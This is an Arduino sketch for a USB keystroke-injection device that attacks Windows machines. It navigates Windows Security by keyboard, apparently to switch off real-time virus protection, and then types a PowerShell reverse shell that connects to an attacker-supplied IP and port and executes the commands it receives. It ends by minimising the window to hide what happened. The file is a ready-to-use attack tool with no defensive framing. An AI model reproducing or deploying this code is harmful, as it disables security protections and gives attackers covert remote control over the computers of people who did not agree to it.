#include <Keyboard.h>
#include <KeyboardLayout.h>
#include <Keyboard_da_DK.h>
#include <Keyboard_de_DE.h>
#include <Keyboard_es_ES.h>
#include <Keyboard_fr_FR.h>
#include <Keyboard_hu_HU.h>
#include <Keyboard_it_IT.h>
#include <Keyboard_pt_PT.h>
#include <Keyboard_sv_SE.h>
#include <Mouse.h>
#define KEY_SPACE 0x20

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */

void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
  // Wait 3500ms
  delay(1000);
  typeKey(KEY_LEFT_GUI); // Press Windows Key
  delay(500);
  Keyboard.print("Windows Security"); // Type "Windows Security"
  delay(1000); // Wait for Windows Security search results to appear
  typeKey(KEY_RETURN); // Press Enter
  delay(4000); // Wait for Windows Security to open

  // Use tab and arrow keys to navigate to "Virus & threat protection"
  typeKey(KEY_RETURN); 
  typeKey(KEY_TAB); // Tab to the navigation pane
  delay(500);
  typeKey(KEY_TAB); // Tab to "Virus & threat protection"
  delay(500);
  typeKey(KEY_TAB); // Tab to the navigation pane
  delay(500);
  typeKey(KEY_TAB);
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  typeKey(KEY_SPACE);
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  delay(500);
  typeKey(KEY_RETURN);
  delay(2500);

  // Type PowerShell commands to start a reverse shell               // put ure ip and port here
  Keyboard.print("$client = New-Object System.Net.Sockets.TCPClient('<ip>', <port>);");
  Keyboard.print("$stream = $client.GetStream();");
  Keyboard.print("[byte[]]$bytes = New-Object byte[] 4096;");
  Keyboard.print("while ($true) {");
  Keyboard.print("$bytes = New-Object byte[] 4096;");
  Keyboard.print("$length = $stream.Read($bytes, 0, $bytes.Length);");
  Keyboard.print("if ($length -eq 0) { break; }");
  Keyboard.print("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $length);");
  Keyboard.print("$sendback = Invoke-Expression $data 2>&1;");
  Keyboard.print("$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';");
  Keyboard.print("$sendbyte = [text.encoding]::ASCII.GetBytes($sendback2);");
  Keyboard.print("$stream.Write($sendbyte, 0, $sendbyte.Length);");
  Keyboard.print("$stream.Flush();");
  Keyboard.print("}");
  Keyboard.press(KEY_RETURN);
  // Minimize the PowerShell window
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  Keyboard.print('n');

  Keyboard.end();
}

/* Unused endless loop */
void loop() {}

